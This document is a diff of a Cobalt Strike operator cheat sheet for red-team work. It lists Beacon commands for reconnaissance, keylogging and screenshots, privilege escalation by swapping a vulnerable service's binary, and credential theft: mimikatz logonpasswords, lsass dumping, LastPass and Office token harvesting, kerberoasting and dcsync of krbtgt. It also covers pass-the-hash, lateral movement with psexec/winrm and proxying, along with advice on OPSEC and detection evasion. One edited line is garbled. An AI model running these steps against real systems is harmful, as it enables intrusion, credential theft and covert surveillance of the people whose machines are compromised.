@@ -28,7 +28,7 @@ Not included:
 cd /home/kali/Downloads/
 tar -zxf arsenal-kit20220817.tgz
 cd arsenal-kit/
-vi arsenal_kit.config                             Make the following changes
+vi arsenal_kit.config                          Make the following changes
 include_udrl_kit="true"
 include_sleepmask_kit="true"
 include_process_inject_kit="true"
@@ -62,11 +62,10 @@ Run c2lint against your new profile to check for possible OPSEC issues.
 
 # OPSEC: If you manually create a new C2 profile, change the following options:
 
-set host_stage          "false";
-set pipename            "changeme_###";           The default SMB Beacon named pipe is msagent_###
-set pipename_stager     "changeme_##";            The default is status_##
-set ssh_banner          "changeme";               The default SSH banner is Cobalt Strike 4.2
-set ssh_pipename        "changeme_####";          The default SSH Beacon named pipe is postex_ssh_####
+set host_stage          "false";t pipename     "changeme_###";     The default SMB Beacon named pipe is msagent_###
+set pipename_stager     "changeme_##";         The default is status_##
+set ssh_banner          "changeme";            The default SSH banner is Cobalt Strike 4.2
+set ssh_pipename        "changeme_####";       The default SSH Beacon named pipe is postex_ssh_####
 
 http-config {
      set headers "Date, Server, Content-Length, Keep-Alive, Connection, Content-Type";
@@ -275,15 +274,15 @@ Feed this raw shellcode into Freeze, msfvenom, or NinSyscallPacker ($) to bypass
 # Interact with a Beacon
 
 Right-click on a Beacon > Interact
-help                                              Help menu
-help <command>                                    Get more help on a particular command
-ctrl +/-                                          Increase or decrease the font size
-ctrl k                                            Clear the window
+help                                                 Help menu
+help <command>                                       Get more help on a particular command
+ctrl +/-                                             Increase or decrease the font size
+ctrl k                                               Clear the window
 
 By default, Beacon will check in every 60 seconds.
-sleep 10                                          Set Beacon sleep time to 10 seconds
-sleep 20 10                                       Set Beacon sleep time to 20 seconds with a 10% jitter (18-22s)
-sleep 0                                           Make a Beacon interactive
+sleep 10                                             Set Beacon sleep time to 10 seconds
+sleep 20 10                                          Set Beacon sleep time to 20 seconds with a 10% jitter (18-22s)
+sleep 0                                              Make a Beacon interactive
 
 - Beacon Object File (BOF)
 A compiled C program that executes within a Beacon.
@@ -292,11 +291,11 @@ It is used to run small commands for a short time.
 
 Cobalt Strike > Script Manger > Load
 /opt/cobaltstrike/third-party/outflanknl-helpcolor/HelpColor.cna
-helpx                                             OPSEC color coded commands
+helpx                                                OPSEC color coded commands
 
 - Jobs
-jobs                                              List long-running post-exploitation tasks
-kill <JID>                                        Kill a process
+jobs                                                 List long-running post-exploitation tasks
+kill <JID>                                           Kill a process
 
 - Misc
 Beacon is fully tab-completable.
@@ -305,67 +304,62 @@ All commands and their output are written to the logs directory.
 Right-click on the X in the tab for additional options.
 https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/appendix-a_beacon-opsec-considerations.htm
 
-Select a particular Beacon > exit                 Beacon will no longer check in
-Right-click on the Beacon > Session > Remove      Remove dead Beacon
+Select a particular Beacon > exit                    Beacon will no longer check in
+Right-click on the Beacon > Session > Remove         Remove dead Beacon
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Situational awareness
 
 Cobalt Strike > Script Manger > Load
 /opt/cobaltstrike/third-party/trustedsec-bof/SA/SA.cna
-helpx                                             New BOF commands added
+helpx                                                New BOF commands added
 
-whoami                                            BOF
-netuser <username>                                BOF - List user info
-ipconfig                                          BOF
-listdns                                           BOF - List DNS cache entries
-routeprint                                        BOF - Print IPv4 routes on the machine
-netstat                                           BOF - List listening and connected IPv4 UDP and TCP connections
-userenum                                          BOF - List computer user accounts
-netLocalGroupList                                 BOF - List groups in this server
-netLocalGroupListMembers <group>                  BOF - List the members in the specified group in this server
-netsession                                        BOF - List sessions on server
-netshares                                         BOF - List shares on local local or remote computer
-pwd                                               Print current directory
-dir                                               BOF - List a target directory
-driversigs                                        BOF - Check drivers for known EDR vendor names
-drives                                            List drives on target
-history                                           Show the command history of the Beacon
+whoami                                               BOF
+netuser <username>                                   BOF - List user info
+ipconfig                                             BOF
+listdns                                              BOF - List DNS cache entries
+routeprint                                           BOF - Print IPv4 routes on the machine
+netstat                                              BOF - List listening and connected IPv4 UDP and TCP connections
+userenum                                             BOF - List computer user accounts
+netLocalGroupList                                    BOF - List groups in this server
+netLocalGroupListMembers <group>                     BOF - List the members in the specified group in this server
+netsession                                           BOF - List sessions on server
+netshares                                            BOF - List shares on local local or remote computer
+pwd                                                  Print current directory
+dir                                                  BOF - List a target directory
+driversigs                                           BOF - Check drivers for known EDR vendor names
+drives                                               List drives on target
+history                                              Show the command history of the Beacon
 
-arp                                               BOF - Runs an internal ARP command
-domainenum                                        BOF - List user accounts in the current domain
-netview                                           BOF - List local workstations and servers
-net domain                                        Show the current domain
-net domain_controllers                            Show domain controllers
-net computers                                     Show doamin computers (this can take a couple of min, be patient)
+arp                                                  BOF - Runs an internal ARP command
+domainenum                                           BOF - List user accounts in the current domain
+netview                                              BOF - List local workstations and servers
+net domain                                           Show the current domain
+net domain_controllers                               Show domain controllers
+net computers                                        Show doamin computers (this can take a couple of min, be patient)
 
-View > Targets                                    Discovered targets will populate
+View > Targets                                       Discovered targets will populate
 
-ps                                                Show process list. Look for another user that is logged in
-inject <PID> <x86|x64> <listener>                 Bad OPSEC, need to use a BOF
+ps                                                   Show process list. Look for another user that is logged in
 
-screenshot <PID> x64                              Take a single screenshot (look for svchost running on the current user)
-                                                  View > Screenshots
+screenshot <PID> x64                                 Take a single screenshot (look for svchost running on the current user)
+                                                     View > Screenshots
 
-keylogger <PID> x64                               Start a keystroke logger (look for svchost running on the current user)
-                                                  View > Keystrokes
+keylogger <PID> x64                                  Start a keystroke logger (look for svchost running on the current user)
+                                                     View > Keystrokes
 
 Right-click on the Beacon > Explore > File Browser
 Right-click on a file > Download
-View > Downloads > select a file > Sync Files     Save downloaded file to your local VM
+View > Downloads > select a file > Sync Files        The downloaded file is saved to your local VM
 
-portscan <target range> <ports> none 255          Scan a network for open services
+portscan <target range> <ports> none 255             Scan a network for open services
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Privilege Escalation
 
-getsystem                                         BOF - Attemp to get SYSTEM
-getprivs                                          Enable system privileges on current token
-getuid                                            Get User ID
-
-Cobalt Strike > Script Manger > Load
-/opt/cobaltstrike/third-party/trustedsec-remote-ops/Injection/Injection.cna
-/opt/cobaltstrike/third-party/trustedsec-remote-ops/Remote/Remote.cna
+getsystem                                            BOF - Attempt to get SYSTEM
+getprivs                                             Enable system privileges on current token
+getuid                                               Get User ID
 
 - Seatbelt
 execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -q DotNet                 Check for versions 2 and 3.5
@@ -386,14 +380,19 @@ NamedPipes, OSInfo, reg, RPCMappedEndpoints, ScheduledTasks, Services, TcpConnec
 
 - PowerUp
 powershell-import /opt/PowerSploit/Privesc/PowerUp.ps1
-powerpick Invoke-PrivescAudit; "done"             Look for a vulnerable service
-Attacks > Packages > Windows Executable (S) > choose your listener
+powerpick Invoke-PrivescAudit; "done"                If you find a vulnerable service, do the following
+Attacks > Packages > Windows Executable (S)
+Choose your listener
 Output: Windows Service EXE
-Use the same name of the vulnerable service binary
+Use the same name as the vulnerable service binary
 cd to the vulnerable binary location
 upload /path/to/new/payload
-sc_stop <vuln service name>                       BOF - If the vulnerable service is running, stop it
-sc_start <vuln service name>                      BOF - Start the vulnerable service, which runs the malicious payload
+
+Cobalt Strike > Script Manger > Load
+/opt/cobaltstrike/third-party/trustedsec-remote-ops/Remote/Remote.cna
+
+sc_stop <vuln service name>                          BOF - If the vulnerable service is running, stop it
+sc_start <vuln service name>                         BOF - Start the vulnerable service, which runs the malicious payload
 
 - SharpUp
 execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/SharpUp.exe audit
@@ -401,15 +400,18 @@ execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/SharpUp.exe audit
 
 # Credential Abuse
 
-hashdump                                          Dump password hashes
-logonpasswords                                    Dump credentials and hashes with mimikatz
+hashdump                                             Dump password hashes
+logonpasswords                                       Dump credentials and hashes with mimikatz
 View > Credentials
 
-prodump <PID of lsass.exe> <C:/Temp/dump.txt>     BOF - Dumps the specified process to the specified output file
+lastpass                                             BOF - Search Chrome, brave memory for LastPass passwords and data
+office_tokens                                        BOF - collect Office JWT Tokens from any Office process
+
+prodump <PID of lsass.exe> <C:/Temp/dump.txt>        BOF - Dumps the specified process to the specified output file
 Right-click on the Beacon > Explore > File Browser
 Browse to the same location as the dump
 Right-click on the file > Download
-View > Downloads > select a file > Sync Files     Save downloaded file to your local VM
+View > Downloads > select a file > Sync Files        Save downloaded file to your local VM
 
 execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -q CredGuard
 execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -q KeePass
@@ -422,14 +424,20 @@ execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Rubeus.exe logonsessi
 - Kerberoasting
 execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Rubeus.exe kerberoast /outfile:hashes.txt
 
+Cobalt Strike > Script Manger > Load
+/opt/cobaltstrike/third-party/trustedsec-remote-ops/Injection/Injection.cna
+
 - Double-hop problem
-steal_token <PID>
-inject <PID> <x86|x64> <listener>                 Bad OPSEC, need to use a BOF
-make_token <domain\user> <password>               Plaintext cred preference
+ps                                                   Show process list.
+steal_token <PID>                                    If someone else logged in, steal their token
+inject <PID> <x86|x64> <listener>                    Bad OPSEC, need to use a BOF
+make_token <domain\user> <password>                  Plaintext creds preference
 pth <domain\user> <hash>
-spawnas <domain\user> <password> <listener>       Bad OPSEC, need to use a BOF
-Using Rubeus to request/apply a new ticket
+spawnas <domain\user> <password> <listener>          Bad OPSEC, need to use a BOF
+Use Rubeus to request/apply a new ticket
 kerberos_ticket_use (with an existing ticket)
+
+dcsync <FQDN DC> doamin\krbtgt                       Grab the KRBTGT NTLM hash
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Lateral movement
@@ -438,38 +446,52 @@ Right-click on a SYSTEM Beacon > Access > Make Token
 Select a user > Build
 
 powershell-import /opt/PowerSploit/Recon/PowerView.ps1
-powerpick Get-DomainUser <user>; "done"           Show groups a user belongs to
-powerpick Get-NetLocalGroupMember <FQDN>; "done"  List users in the administrator group on a remote computer
+powerpick Get-DomainUser <user from above>; "done"   Show groups a user belongs to
 powerpick Get-DomainComputer -Ping -Properties dnshostname; "done"   Show domain computers
+powerpick Get-NetLocalGroupMember <FQDN*>; "done"    Show users in the local administrator group on a remote computer (* each computer above)
+dir \\<FQDN>\C$\                                     BOF - Check to see if you have access to a remote computer (include the trailing backslash)
+
+If you have access, establish a new Beacon on that host
+jump <psexec, psexec64, psexec_psh, winrm, winrm64> <FQDN> <listener>   Bad OPSEC, need to use a BOF
+Privesc and dump creds
+
 powerpick Get-DomainUser-SPN -Properties samaccountname, serviceprincipalnaame; "done"
-powerpick Invoke-Kerberoast <samaccountname> | fl
+powerpick Invoke-Kerberoast <samaccountname> | fl; "done"
 
 Copy the hash and crack with john.
 make_token domain\user <password>
-dir \\<FQDN>\C$\                                  BOF - Check to see if you have access (include the trailing backslash)
-
-jump <psexec, psexec64, psexec_psh, winrm, winrm64> <FQDN> <smb listener>   Bad OPSEC, need to use a BOF
+dir \\<FQDN>\C$\
 
 pth domain\user <hash>
-dir \\<FQDN>\C$\                                  BOF - Check to see if you have access (include the trailing backslash)
+dir \\<FQDN>\C$\
 
-dcsync <FQDN DC> doamin\krbtgt                    Grab the NTLM hash
+powerpick Get-Domain; "done"                         Show info on the current domain
+powerpick Get-DomainTrust; "done"                    Get all domain trusts
+powerpick Get-DomainTrustMapping; "done"             Recursively mapp all domain trusts
+powerpick Get-Forest; "done"                         Show info on the current forest
+powerpick Get-ForestDomain; "done"                   Enumerate all domains in the current forest
+powerpick Get-ForestTrust; "done"                    Get all forest trusts for the current forest
 
-powerpick Get-Domain                              Show the current domain
-powerpick Get-DomainTrust                         Show trust type and direction
-powerpick Get-DomainTrust -LDAP
-powerpick Get-ForestTrust
-powerpick Get-DomainComputer -Domain <other domain> -Ping -Properties dnshostname
-powerpick Get-DomainController -Domain <other domain>
-powerpick Get-NetLocalGroupMember <other FQDN DC>
-powerpick Get-DomainForeignGroupMember -Domain <other domain>
-powerpick "<MemberName>" | ConvertFrom-SID
+powerpick Get-DomainComputer -Domain <other domain> -Ping -Properties dnshostname; "done"
+powerpick Get-DomainController -Domain <other domain>; "done"
+powerpick Get-NetLocalGroupMember <other FQDN DC>; "done"
+powerpick Get-DomainForeignGroupMember -Domain <other domain>; "done"   Find users in groups outside of the given domain
+powerpick "<MemberName>" | ConvertFrom-SID; "done"
+
+What is my target?
+Who or what has control of the target?
+  Get-NetLocalGroupMember -ComputerName <computer>
+  Get-DomainGPOUserLocalGroupMapping [-Domain <domain>]
+Where is the person who has control?
+  Get-NetSession -ComputerName <computer>
+  Get-NetLoggedOn –ComputerName <computer>
+  Find-DomainUserLocation [-Domain <domain>]
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # SOCKS proxy
 
-sleep 0                                           Make a Beacon interactive
-socks <port>                                      Start a SOCKS4a proxy server on the team server (example 8080)
-/etc/proxychains4.conf                            Edit your attack VM’s config at the bottom with the team server IP and proxy port
+sleep 0                                              Make a Beacon interactive
+socks <port>                                         Start a SOCKS4a proxy server on the team server (example 8080)
+/etc/proxychains4.conf                               Edit your attack VM’s config at the bottom with the team server IP and proxy port
 proxychains <tool/options>
 proxychains xfreerdp /u:<domain\user> /p:<password> /v:<IP>
